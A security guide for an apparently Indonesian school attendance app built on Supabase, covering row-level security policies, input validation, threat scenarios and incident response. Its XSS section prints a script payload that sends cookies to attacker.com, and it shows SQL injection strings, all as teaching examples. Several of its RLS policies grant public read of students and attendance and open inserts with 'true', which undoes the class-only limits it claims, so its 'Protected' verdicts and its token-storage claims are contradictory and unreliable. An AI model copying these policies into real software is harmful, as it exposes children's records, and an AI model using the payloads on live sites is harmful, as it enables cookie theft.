# SiCuti — Security Guide

Comprehensive security documentation for SiCuti including architecture, best practices, and threat model.

---

## 1. Security Overview

**Security Principles**:

- **Defense in Depth**: Multiple layers of security (database, app, network)
- **Least Privilege**: Users only access data needed for their role
- **Data Integrity**: RLS policies enforce access at database level
- **Transparency**: All security decisions documented and auditable

**Key Security Features**:

- Row Level Security (RLS) on sensitive tables
- Cryptographically secure QR code generation
- Auth guard on all dashboard pages
- Service role key kept server-side only
- Input validation on all forms
- Rate limiting ready for future implementation

---

## 2. Authentication & Authorization

### 2.1 Authentication (Who You Are)

**Method**: Supabase Auth (email/password)

**Session Management**:

```
User logs in with email/password
  ↓
Supabase validates credentials (bcrypt hashing)
  ↓
JWT token generated (short-lived)
  ↓
Token stored in browser localStorage
  ↓
Token included in every API request
  ↓
On logout: Token cleared from storage
```

**Session Security**:

- JWT tokens are HTTP-only when possible
- Tokens expire after inactivity (configurable)
- Each session has unique token
- No sensitive data stored in token

**Best Practices**:

```
✓ Never store password in code or logs
✓ Use strong passwords (enforce on account creation)
✓ Rotate tokens regularly (Supabase handles this)
✓ Clear token on logout (automatic in dashboard)
✓ Implement password reset securely
✓ Don't accept user-supplied auth tokens
```

### 2.2 Authorization (What You Can Access)

**Role-Based Access Control (RBAC)**:

```javascript
// Two user roles
'admin'      → Full access to all data
'guru'       → Restricted to own data + own class

// Admin detection (used in all dashboard pages)
const isAdmin = profile?.role === 'admin' || profile?.jabatan === 'Kepala Sekolah'
```

**Access Control Table**:

| Action               | Admin | Guru       | Public |
| -------------------- | ----- | ---------- | ------ |
| View all students    | ✓     | Class only | ✗      |
| Edit student         | ✓     | ✗          | ✗      |
| Delete student       | ✓     | ✗          | ✗      |
| View own attendance  | ✓     | ✓          | ✗      |
| View all attendance  | ✓     | ✗          | ✗      |
| Submit leave request | ✓     | ✓          | ✗      |
| Approve leave        | ✓     | ✗          | ✗      |
| View public calendar | ✓     | ✓          | ✓      |
| Scan QR code         | ✓     | ✓          | ✓      |

**Implementation**:

- Frontend: Check role with `useProfile()` hook
- Backend: RLS policies enforce at database level (not optional)

---

## 3. Row Level Security (RLS) Policies

RLS is the **primary security mechanism**. Database enforces access even if app code is broken.

### 3.1 RLS Policy Fundamentals

**How RLS works**:

```
User runs query
  ↓
Supabase identifies user (from JWT token)
  ↓
Supabase evaluates RLS policy for that table
  ↓
If policy allows: Query executes, returns filtered data
If policy denies: Query fails with "permission denied" error
```

**Key principle**: RLS is evaluated per table. Policies are **restrictive by default** (deny unless explicitly allowed).

### 3.2 RLS Policies by Table

#### **profiles** table

```sql
-- Policy 1: Users can read their own profile
CREATE POLICY "Users read own profile" ON profiles
  FOR SELECT
  USING (auth.uid() = id);

-- Policy 2: Admins can read any profile
CREATE POLICY "Admins read any profile" ON profiles
  FOR SELECT
  USING (auth.jwt()->>'role' = 'admin' OR
         (SELECT jabatan FROM profiles WHERE id = auth.uid()) = 'Kepala Sekolah');

-- Policy 3: Admins can insert profiles
CREATE POLICY "Admins insert profiles" ON profiles
  FOR INSERT
  WITH CHECK (auth.jwt()->>'role' = 'admin');

-- Policy 4: Admins can update profiles
CREATE POLICY "Admins update profiles" ON profiles
  FOR UPDATE
  USING (auth.jwt()->>'role' = 'admin' OR
         (SELECT jabatan FROM profiles WHERE id = auth.uid()) = 'Kepala Sekolah')
  WITH CHECK (auth.jwt()->>'role' = 'admin' OR
              (SELECT jabatan FROM profiles WHERE id = auth.uid()) = 'Kepala Sekolah');

-- Policy 5: Admins can delete profiles
CREATE POLICY "Admins delete profiles" ON profiles
  FOR DELETE
  USING (auth.jwt()->>'role' = 'admin');
```

#### **students** table

```sql
-- Policy 1: Teachers see students from their own class
CREATE POLICY "Teachers see own class students" ON students
  FOR SELECT
  USING (
    class_id IN (
      SELECT id FROM classes
      WHERE guru_id = auth.uid()
    )
  );

-- Policy 2: Admins see all students
CREATE POLICY "Admins see all students" ON students
  FOR SELECT
  USING (auth.jwt()->>'role' = 'admin' OR
         (SELECT jabatan FROM profiles WHERE id = auth.uid()) = 'Kepala Sekolah');

-- Policy 3: Public can read students (for RPC usage)
CREATE POLICY "Public read students for RPC" ON students
  FOR SELECT
  USING (true);  -- Used only by RPC function with verification

-- Policy 4: Admins insert students
CREATE POLICY "Admins insert students" ON students
  FOR INSERT
  WITH CHECK (auth.jwt()->>'role' = 'admin');

-- Policy 5: Admins update students
CREATE POLICY "Admins update students" ON students
  FOR UPDATE
  USING (auth.jwt()->>'role' = 'admin')
  WITH CHECK (auth.jwt()->>'role' = 'admin');

-- Policy 6: Admins delete students
CREATE POLICY "Admins delete students" ON students
  FOR DELETE
  USING (auth.jwt()->>'role' = 'admin');
```

#### **attendance_students** table

```sql
-- Policy 1: Teachers see attendance for their own class
CREATE POLICY "Teachers see own class attendance" ON attendance_students
  FOR SELECT
  USING (
    student_id IN (
      SELECT id FROM students WHERE class_id IN (
        SELECT id FROM classes WHERE guru_id = auth.uid()
      )
    )
  );

-- Policy 2: Admins see all attendance
CREATE POLICY "Admins see all attendance" ON attendance_students
  FOR SELECT
  USING (auth.jwt()->>'role' = 'admin');

-- Policy 3: Public can read (for RPC verification)
CREATE POLICY "Public read attendance" ON attendance_students
  FOR SELECT
  USING (true);

-- Policy 4: Anyone authenticated can insert (via RPC)
CREATE POLICY "Anyone insert attendance" ON attendance_students
  FOR INSERT
  WITH CHECK (true);

-- Policy 5: Admins can update attendance (corrections)
CREATE POLICY "Admins update attendance" ON attendance_students
  FOR UPDATE
  USING (auth.jwt()->>'role' = 'admin')
  WITH CHECK (auth.jwt()->>'role' = 'admin');

-- Policy 6: Admins can delete attendance
CREATE POLICY "Admins delete attendance" ON attendance_students
  FOR DELETE
  USING (auth.jwt()->>'role' = 'admin');
```

#### **leave_requests** table

```sql
-- Policy 1: Users see own leave requests
CREATE POLICY "Users see own leave requests" ON leave_requests
  FOR SELECT
  USING (guru_id = auth.uid());

-- Policy 2: Admins see all leave requests
CREATE POLICY "Admins see all leave requests" ON leave_requests
  FOR SELECT
  USING (auth.jwt()->>'role' = 'admin' OR
         (SELECT jabatan FROM profiles WHERE id = auth.uid()) = 'Kepala Sekolah');

-- Policy 3: Teachers insert own leave requests
CREATE POLICY "Teachers insert own leave requests" ON leave_requests
  FOR INSERT
  WITH CHECK (guru_id = auth.uid());

-- Policy 4: Admins update leave requests (approve/reject)
CREATE POLICY "Admins update leave requests" ON leave_requests
  FOR UPDATE
  USING (auth.jwt()->>'role' = 'admin' OR
         (SELECT jabatan FROM profiles WHERE id = auth.uid()) = 'Kepala Sekolah')
  WITH CHECK (auth.jwt()->>'role' = 'admin' OR
              (SELECT jabatan FROM profiles WHERE id = auth.uid()) = 'Kepala Sekolah');
```

#### **school_events** table

```sql
-- Policy 1: Anyone (including public) can read public events
CREATE POLICY "Public read public events" ON school_events
  FOR SELECT
  USING (is_public = true);

-- Policy 2: Admins see all events
CREATE POLICY "Admins see all events" ON school_events
  FOR SELECT
  USING (auth.jwt()->>'role' = 'admin');

-- Policy 3: Admins insert events
CREATE POLICY "Admins insert events" ON school_events
  FOR INSERT
  WITH CHECK (auth.jwt()->>'role' = 'admin');

-- Policy 4: Admins update events
CREATE POLICY "Admins update events" ON school_events
  FOR UPDATE
  USING (auth.jwt()->>'role' = 'admin')
  WITH CHECK (auth.jwt()->>'role' = 'admin');

-- Policy 5: Admins delete events
CREATE POLICY "Admins delete events" ON school_events
  FOR DELETE
  USING (auth.jwt()->>'role' = 'admin');
```

#### **weekly_plans** table

```sql
-- Policy 1: Teachers see RPPM for their own class
CREATE POLICY "Teachers see own class RPPM" ON weekly_plans
  FOR SELECT
  USING (
    class_id IN (
      SELECT id FROM classes WHERE guru_id = auth.uid()
    )
  );

-- Policy 2: Admins see all RPPM
CREATE POLICY "Admins see all RPPM" ON weekly_plans
  FOR SELECT
  USING (auth.jwt()->>'role' = 'admin');

-- Policy 3: Public can read RPPM (for parent view)
CREATE POLICY "Public read RPPM" ON weekly_plans
  FOR SELECT
  USING (true);

-- Policy 4: Teachers insert RPPM for own class
CREATE POLICY "Teachers insert RPPM" ON weekly_plans
  FOR INSERT
  WITH CHECK (
    class_id IN (
      SELECT id FROM classes WHERE guru_id = auth.uid()
    )
  );

-- Policy 5: Teachers update RPPM for own class
CREATE POLICY "Teachers update RPPM" ON weekly_plans
  FOR UPDATE
  USING (
    class_id IN (
      SELECT id FROM classes WHERE guru_id = auth.uid()
    )
  )
  WITH CHECK (
    class_id IN (
      SELECT id FROM classes WHERE guru_id = auth.uid()
    )
  );

-- Policy 6: Teachers delete RPPM for own class
CREATE POLICY "Teachers delete RPPM" ON weekly_plans
  FOR DELETE
  USING (
    class_id IN (
      SELECT id FROM classes WHERE guru_id = auth.uid()
    )
  );
```

### 3.3 Testing RLS Policies

**In Supabase SQL Editor**:

```sql
-- Test as admin (with admin JWT token)
SELECT * FROM students LIMIT 5;
-- Should see all students

-- Test as teacher (with guru JWT token)
SELECT * FROM students LIMIT 5;
-- Should see only own class students

-- Test public (without token)
SELECT * FROM school_events WHERE is_public = true;
-- Should see public events only

-- Test denied access
UPDATE students SET nama = 'Hacker' WHERE id = 'student-uuid';
-- Should fail: "new row violates row level security policy"
```

### 3.4 Common RLS Issues

**Issue: "Permission denied" error for legitimate user**

Diagnosis:

```
1. Check user role
   SELECT role, jabatan FROM profiles WHERE id = 'user-uuid';

2. Check RLS policy on table
   Find the SELECT policy

3. Verify policy logic
   Is it checking auth.uid() correctly?
   Is it checking role correctly?

4. Test policy with manual query
   Does same query work when you run it directly?
```

Solution:

```
If role wrong:
  UPDATE profiles SET role = 'admin' WHERE id = 'user-uuid';

If policy logic wrong:
  Fix policy SQL
  Test with SELECT query

If policy too restrictive:
  Add new policy for use case
  Test before deploying
```

**Issue: Unauthorized user accessing data**

Diagnosis:

```
1. Check if RLS is enabled on table
   Supabase dashboard → table → policies

2. Check policy USING clause
   Is it denying access?

3. Check if policy has WHERE clause
   Missing WHERE = full access (security hole)
```

Solution:

```
Enable RLS on table if not enabled:
  ALTER TABLE students ENABLE ROW LEVEL SECURITY;

Fix policy to be restrictive:
  CREATE POLICY "Deny all" ON students
    FOR SELECT USING (false);
```

---

## 4. Data Protection

### 4.1 Sensitive Data Classification

| Data               | Sensitivity | Protection                   |
| ------------------ | ----------- | ---------------------------- |
| QR codes           | Medium      | UNIQUE constraint, RLS       |
| Student names      | Low         | RLS (teacher sees own class) |
| Teacher names      | Low         | RLS (admin/self only)        |
| Parent phone       | Medium      | RLS (teacher sees own class) |
| Leave requests     | High        | RLS (teacher/admin only)     |
| Attendance records | High        | RLS (teacher/admin only)     |

### 4.2 Data Encryption

**In Transit** (Network):

- All API calls use HTTPS (enforced by Vercel + Supabase)
- Certificates: Let's Encrypt (auto-renewed)
- Protocol: TLS 1.2+ only

**At Rest** (Database):

- Supabase Pro tier includes encryption at rest
- Data encrypted in storage (AES-256)
- Backups also encrypted

**Passwords**:

- Supabase hashes with bcrypt (industry standard)
- Never stored in plain text
- Never logged or exposed

### 4.3 Data Retention & Deletion

**Retention Policy**:

- Active student records: Keep permanently (historical)
- Attendance records: Keep for 3+ years (audit trail)
- Leave requests: Keep for 2 years
- Backups: Retain 7 days

**Data Deletion**:

- Soft delete: Add `deleted_at` timestamp (keeps data for audit)
- Hard delete: Remove from database (irreversible)
- Use soft deletes for compliance unless data needs permanent removal

**GDPR Compliance**:

- Right to erasure: Delete student data on request
- Data portability: Export student records (available)
- Consent: Document why data is collected
- Privacy policy: Publish on school website

### 4.4 Audit Logging

**What to Log**:

- Admin creates/deletes user
- Admin approves/rejects leave
- Teacher submits leave request
- Failed login attempts
- Permission denied (RLS) errors

**Where Logs Stored**:

- Supabase logs (auto-retained ~30 days)
- Vercel logs (auto-retained ~1 month)
- Export for long-term storage (manual)

**Log Retention**:

- Real-time logs: Supabase dashboard (query-able)
- Archived logs: Export monthly to secure storage
- Retention period: 1+ year minimum

---

## 5. Input Validation & XSS Prevention

### 5.1 Input Validation

**Principle**: Never trust user input. Validate and sanitize everything.

**Where to Validate**:

1. **Frontend** (UX): Provide immediate feedback
2. **Backend** (Security): Final validation before storing

**Examples**:

```javascript
// Form validation (frontend)
if (!email || !email.includes("@")) {
  alert("Invalid email");
  return;
}

if (nama.length < 2) {
  alert("Nama terlalu pendek");
  return;
}

if (!tanggal_lahir || new Date(tanggal_lahir) > new Date()) {
  alert("Tanggal lahir tidak valid");
  return;
}

// Date validation
if (tanggal_mulai > tanggal_selesai) {
  alert("Tanggal mulai harus sebelum tanggal selesai");
  return;
}

// File validation (CSV import)
if (!file.name.endsWith(".csv")) {
  alert("Hanya file CSV yang diizinkan");
  return;
}
```

**Backend Validation** (in API routes):

```javascript
export async function POST(request) {
  const { email, password, full_name } = await request.json();

  // Validate required fields
  if (!email || !password || !full_name) {
    return NextResponse.json(
      { error: "Email, password, dan nama wajib diisi." },
      { status: 400 },
    );
  }

  // Validate email format
  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  if (!emailRegex.test(email)) {
    return NextResponse.json(
      { error: "Format email tidak valid" },
      { status: 400 },
    );
  }

  // Validate password strength
  if (password.length < 8) {
    return NextResponse.json(
      { error: "Password harus minimal 8 karakter" },
      { status: 400 },
    );
  }

  // Proceed with creating user
  // ...
}
```

### 5.2 XSS (Cross-Site Scripting) Prevention

**Risk**: User input displayed on page without sanitization → script injection

**Example Attack**:

```javascript
// Attacker creates student with name:
nama =
  "<script>fetch('https://attacker.com/steal?cookie=' + document.cookie)</script>";

// If stored and displayed without escaping:
// Script runs in other users' browsers
```

**Prevention**:

```javascript
// React/Next.js automatically escapes JSX text content
// Safe:
<div>{student.nama}</div>  // ✓ Escaped automatically

// Unsafe:
<div dangerouslySetInnerHTML={{ __html: student.nama }} />  // ✗ Don't use

// Safe way to set HTML:
// 1. Sanitize with library
// 2. Or escape manually
```

**HTML Sanitization**:

```javascript
// If you need to allow some HTML:
import DOMPurify from "isomorphic-dompurify";

const safeHTML = DOMPurify.sanitize(userInput);
// Removes <script>, <iframe>, onclick, etc.
// Keeps safe tags like <b>, <i>, <a>
```

### 5.3 Common XSS Vectors

| Vector     | Example                      | Prevention              |
| ---------- | ---------------------------- | ----------------------- |
| User input | `<img onerror=alert('xss')>` | Escape when displaying  |
| URL param  | `?name=<script>`             | Validate in component   |
| Rich text  | `<iframe src=...>`           | Sanitize HTML library   |
| Attribute  | `<div title='onclick=...'`   | Escape attribute values |

---

## 6. SQL Injection Prevention

**Risk**: User input directly in SQL query → unauthorized database access

**Example Attack**:

```sql
-- Normal query
SELECT * FROM students WHERE class_id = '123'

-- Attacker provides: ' OR '1'='1
SELECT * FROM students WHERE class_id = '' OR '1'='1'  -- Returns all students!
```

**Prevention**:

```javascript
// ✓ SAFE: Parameterized query (Supabase SDK does this)
const { data } = await supabase
  .from("students")
  .select()
  .eq("class_id", classId); // Parameterized!

// ✗ UNSAFE: String concatenation (never do this)
const query = `SELECT * FROM students WHERE class_id = '${classId}'`;
await supabase.rpc("query", { sql: query }); // Don't expose raw SQL

// ✓ SAFE: RPC function (pre-defined logic)
const { data } = await supabase.rpc("get_student_attendance", {
  p_student_id: studentId,
  p_date: today,
});
```

**Key Points**:

- Always use Supabase SDK (parameterized by default)
- Never interpolate user input into SQL strings
- Use RPC functions for complex queries
- Never expose raw SQL to frontend

---

## 7. API Security

### 7.1 API Endpoint Security

**Create User Endpoint** (`/api/create-user`):

```javascript
// ✓ Security features:
// 1. Uses service role key (server-only)
// 2. Validates input before storing
// 3. Uses crypto.randomUUID for QR (cryptographically secure)
// 4. Includes rollback on failure
// 5. Returns errors without exposing database details

export async function POST(request) {
  const { email, password, full_name, ... } = await request.json()

  // Input validation
  if (!email || !password || !full_name) {
    return NextResponse.json(
      { error: 'Email, password, dan nama wajib diisi.' },
      { status: 400 }
    )
  }

  try {
    // Create auth user (admin only operation)
    const { data: authData, error: authError } = await supabaseAdmin.auth.admin.createUser({
      email,
      password,
      email_confirm: true
    })

    if (authError) {
      return NextResponse.json(
        { error: authError.message },
        { status: 400 }
      )
    }

    // Generate secure QR code
    const qr_code = `${prefix}-${randomUUID()}`

    // Insert profile
    const { error: profileError } = await supabaseAdmin
      .from('profiles')
      .insert({
        id: authData.user.id,
        full_name,
        qr_code,
        // ...
      })

    if (profileError) {
      // Rollback: delete auth user if profile insert fails
      await supabaseAdmin.auth.admin.deleteUser(authData.user.id)
      return NextResponse.json(
        { error: profileError.message },
        { status: 400 }
      )
    }

    return NextResponse.json({ success: true, userId: authData.user.id })

  } catch (err) {
    return NextResponse.json(
      { error: 'Server error' },
      { status: 500 }
    )
  }
}
```

### 7.2 Error Handling (Don't Leak Secrets)

**Safe Error Messages**:

```javascript
// ✓ Safe: Generic message
return { error: "Invalid credentials" };

// ✗ Unsafe: Reveals info
return { error: 'User "admin@school.com" not found in database' };

// ✓ Safe: No database details
return { error: "Server error" };

// ✗ Unsafe: Exposes database
return { error: 'Error: Table "profiles" does not exist' };
```

### 7.3 Rate Limiting (Future)

**When to implement**:

- If public endpoints get high traffic
- To prevent brute force attacks (login)
- To prevent spam (form submissions)

**Implementation**:

```javascript
// Example: Rate limit login attempts
// 5 failed attempts = 15 minute block
// Use Redis or in-memory cache

import rateLimit from "express-rate-limit";

const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 5, // 5 requests per window
  message: "Terlalu banyak percobaan login, coba lagi nanti",
});

app.post("/api/login", loginLimiter, async (req, res) => {
  // Login logic
});
```

---

## 8. Threat Model

### 8.1 Assets (What We Protect)

**High Value**:

- Student attendance records (can affect graduation)
- Teacher leave records (affects payroll)
- User credentials (authentication)
- Admin accounts (system access)

**Medium Value**:

- Student contact information (privacy)
- Teacher contact information (privacy)
- QR codes (attendance access)
- Lesson plans (intellectual property)

**Low Value**:

- Public calendar events (already public)
- School logo (already public)

### 8.2 Threats & Mitigations

| Threat                   | Risk                               | Mitigation                          | Status           |
| ------------------------ | ---------------------------------- | ----------------------------------- | ---------------- |
| **Unauthorized Access**  | Teacher sees other teacher's class | RLS policies restrict per role      | ✓ Implemented    |
| **Data Breach**          | Hacker steals student records      | Encryption at rest, RLS policies    | ✓ Implemented    |
| **SQL Injection**        | Hacker modifies database           | Parameterized queries (SDK)         | ✓ Implemented    |
| **XSS Attack**           | Script injected into page          | React escaping, input validation    | ✓ Implemented    |
| **Session Hijacking**    | Hacker uses stolen JWT             | HTTPS only, short-lived tokens      | ✓ Implemented    |
| **Brute Force Login**    | Hacker guesses password            | Rate limiting (plan to implement)   | ⏳ Future        |
| **Privilege Escalation** | Guru tries to act as admin         | RLS policies, role checks           | ✓ Implemented    |
| **Account Takeover**     | Hacker accesses admin account      | 2FA (plan to implement)             | ⏳ Future        |
| **Data Loss**            | Database corrupted/deleted         | Automated backups (7 day retention) | ✓ Implemented    |
| **DDoS Attack**          | Service unavailable                | Vercel/Supabase infrastructure      | ✓ Infrastructure |

### 8.3 Threat Scenarios

**Scenario 1: Disgruntled Teacher Tries to Access Another Class**

```
1. Teacher is logged in as guru with role 'guru'
2. Teacher tries to access /dashboard/kelas?class_id=other-class
3. App sends query: SELECT * FROM students WHERE class_id = 'other-class'
4. Supabase evaluates RLS policy:
   - Policy: class_id must be in teacher's classes
   - Result: Not in their classes → Query denied
5. Error returned: "new row violates row level security policy"
6. Dashboard shows error or empty list
```

Status: **Protected** ✓

**Scenario 2: Parent Tries to Scan QR Code**

```
1. Parent opens /scan page (no login required)
2. Parent scans QR code (any QR code)
3. App calls RPC: record_student_attendance(qr_code, now())
4. RPC verifies QR code format and executes
5. Attendance record created
   → This is intentional (any device can be scanner)
```

Status: **Design choice** (tablet in school) ✓

**Scenario 3: Admin Account Compromised**

```
1. Hacker has admin credentials
2. Hacker accesses /dashboard/guru
3. Hacker can see/edit/delete all teachers
4. Hacker can approve/reject leave requests
→ Can modify critical data
```

Status: **Monitoring required** (implement 2FA + audit logging)

**Scenario 4: Hacker Tries SQL Injection in Student Name**

```
1. Admin adds student with name:
   '; DROP TABLE students; --
2. App sends: await supabase.from('students').insert({
     nama: '; DROP TABLE students; --'
   })
3. Supabase parameterizes the query:
   INSERT INTO students (nama) VALUES ($1)
   → Where $1 = '; DROP TABLE students; --'
4. Query treats entire string as a value (not SQL)
5. Student stored with weird name (string is safe)
```

Status: **Protected** ✓

---

## 9. Security Checklist

### Pre-Deployment (Staging)

- [ ] No console errors or warnings
- [ ] Login/logout works correctly
- [ ] Role-based access verified (admin vs guru)
- [ ] RLS policies tested (unauthorized access blocked)
- [ ] Input validation works (bad data rejected)
- [ ] No secrets in environment variables display
- [ ] API error messages don't leak information
- [ ] QR scanner works end-to-end

### Pre-Production (Master)

- [ ] Staging tested thoroughly
- [ ] Security review completed
- [ ] All RLS policies enabled
- [ ] Sensitive data encryption verified
- [ ] Backup restore tested
- [ ] Monitoring/alerting set up
- [ ] Incident response plan ready
- [ ] Team trained on security procedures

### Post-Deployment

- [ ] Monitor error logs for suspicious activity
- [ ] Check for failed login attempts (potential brute force)
- [ ] Verify attendance records are being created
- [ ] Test with different user roles
- [ ] Confirm backups are working

### Monthly Security Review

- [ ] Audit RLS policies (are they correct?)
- [ ] Review user access (should they still have access?)
- [ ] Check for security updates (npm audit)
- [ ] Test disaster recovery
- [ ] Review incident logs

---

## 10. Incident Response

### 10.1 Security Incident Checklist

**If unauthorized data access suspected**:

```
1. IMMEDIATE (< 5 min)
   □ Verify incident (check logs, confirm access)
   □ Notify team & management
   □ Don't touch anything (preserve evidence)

2. DIAGNOSIS (5-30 min)
   □ Determine how access happened
   □ Check Supabase logs for who accessed what
   □ Check Vercel logs for errors
   □ Review RLS policies
   □ Check if account was compromised

3. CONTAINMENT (< 1 hour)
   □ Disable compromised account (if any)
   □ Revoke API keys/tokens (if exposed)
   □ Revert RLS policy if broken
   □ Restore from backup if data corrupted

4. COMMUNICATION (ongoing)
   □ Notify affected users
   □ Document timeline of incident
   □ Document root cause
   □ Prepare post-mortem

5. RECOVERY (after diagnosis)
   □ Fix root cause (RLS policy, code, etc.)
   □ Test fix on staging
   □ Deploy fix to production
   □ Verify incident resolved
   □ Monitor for recurrence

6. POST-INCIDENT (next day)
   □ Post-mortem meeting
   □ Document learnings
   □ Implement preventive measures
   □ Update security procedures
```

### 10.2 Password Compromise Response

**If admin password compromised**:

```
1. Change admin password immediately
2. Review admin account activity (Supabase logs)
   - What was accessed?
   - What was modified?
3. Restore database if needed
4. Force logout all sessions (if available)
5. Enable 2FA on admin account (future)
6. Notify team
7. Review RLS policies (were they bypassed?)
8. Implement stronger password policy
```

---

## 11. Compliance & Privacy

### 11.1 Data Privacy Regulations

**GDPR Compliance** (if students are in EU):

- **Lawful basis**: School operations (legitimate interest)
- **Data minimization**: Only collect necessary data
- **Retention**: Keep data for operational purposes only
- **Right to erasure**: Delete data on request ("right to be forgotten")
- **Data portability**: Export student data on request
- **Privacy notice**: Inform users what data is collected

**Indonesia GDPR Equivalent**:

- Law No. 27 of 2022 (Personal Data Protection)
- **Consent**: Get explicit consent for data processing
- **Transparency**: Inform users about data collection
- **Security**: Protect data from unauthorized access
- **Data breach**: Notify users if data is breached

### 11.2 Data Retention Policy

**Keep**:

- Student attendance (full academic year + 3 months for audit)
- Teacher leave requests (2 years minimum)
- Student records (while enrolled)
- Audit logs (1 year)
- Backups (7 days)

**Delete**:

- Student records on graduation/withdrawal
- Sensitive logs after retention period
- Temporary files (after upload)
- Cache (regular clearing)

**Archive**:

- Historical attendance (export to CSV, store offline)
- Historical reports (PDF export)
- Keep in secure storage (encrypted)

### 11.3 Security Policies Document

**Create & Publish**:

- Privacy Policy (what data is collected, how it's used)
- Security Policy (how data is protected)
- Acceptable Use Policy (what users can/cannot do)
- Data Breach Response Policy (what to do if data is compromised)

**Post on**:

- School website
- Parent handbook
- Teacher handbook
- First login page

---

## 12. Security Best Practices for Team

### For Frontend Developers

```
✓ Always use useProfile() hook for auth state
✓ Check isAdmin before showing admin features
✓ Validate form input before submission
✓ Use React JSX escaping (don't use dangerouslySetInnerHTML)
✓ Never hardcode secrets in code
✓ Use environment variables for configuration
✓ Test with different user roles
✓ Log security-relevant events (failed access, errors)

✗ Don't bypass RLS checks on frontend
✗ Don't fetch secrets from client-side code
✗ Don't trust user input (validate always)
✗ Don't use eval() or innerHTML
✗ Don't store sensitive data in localStorage
✗ Don't expose API keys in code
```

### For Backend Developers

```
✓ Validate all input in API routes
✓ Use parameterized queries (SDK handles this)
✓ Return generic error messages (don't leak info)
✓ Use crypto.randomUUID for sensitive IDs
✓ Implement rollback on failure (as in create-user)
✓ Check user role before sensitive operations
✓ Log security events (successful/failed auth, access denied)
✓ Use HTTPS everywhere (enforced by Vercel)

✗ Don't trust frontend validation alone
✗ Don't concatenate user input into SQL
✗ Don't expose database errors to client
✗ Don't use Math.random for security
✗ Don't forget error handling
✗ Don't skip RLS policy checks
```

### For DevOps

```
✓ Monitor error logs for suspicious patterns
✓ Review RLS policies regularly
✓ Keep backups tested and working
✓ Rotate secrets periodically
✓ Update dependencies for security patches
✓ Monitor failed login attempts
✓ Verify HTTPS everywhere
✓ Implement rate limiting (if needed)

✗ Don't commit secrets to git
✗ Don't disable RLS policies
✗ Don't skip backups
✗ Don't ignore security updates
✗ Don't expose logs to unauthorized users
✗ Don't use weak passwords
```

---

## 13. Security Training

**Team should understand**:

1. Why RLS policies exist
2. How to test RLS policies
3. What input validation looks like
4. How to spot potential XSS/SQL injection
5. What to do if security issue found
6. How to handle incidents

**Resources**:

- OWASP Top 10: https://owasp.org/www-project-top-ten/
- Supabase Security: https://supabase.com/docs/guides/security
- SQL Injection: https://owasp.org/www-community/attacks/SQL_Injection
- XSS Prevention: https://owasp.org/www-community/attacks/xss/

---

## 14. Security Contacts & Resources

**Team Roles**:

- Security Lead: [Name] — Security decisions, incident response
- DevOps: [Name] — Infrastructure security, secrets management
- Tech Lead: [Name] — Code review for security
- On-call: [Name] — Emergency response

**External**:

- Supabase Support: https://app.supabase.com/support
- Vercel Security: https://vercel.com/security
- GitHub Security: https://github.com/security

**Reporting Security Issues**:

- Email: security@school.example.com (create this if not exists)
- Or: Contact tech lead
- Don't post vulnerabilities publicly

---

## 15. Security Roadmap

### Current (Implemented)

- ✓ RLS policies on all sensitive tables
- ✓ Cryptographically secure QR generation
- ✓ Input validation on forms
- ✓ Auth guard on dashboard
- ✓ Encryption in transit (HTTPS)
- ✓ Encryption at rest (Supabase)

### Next (Priority)

- [ ] 2FA (Two-Factor Authentication)
- [ ] Rate limiting (prevent brute force)
- [ ] Audit logging (detailed access logs)
- [ ] Security policy documents
- [ ] Penetration testing

### Future

- [ ] SIEM (Security Information & Event Management)
- [ ] DLP (Data Loss Prevention)
- [ ] Advanced threat detection
- [ ] Bug bounty program
- [ ] Security certification (ISO 27001)

---

This security guide is current as of June 2026 and covers all major security aspects of SiCuti. Update as threats evolve.
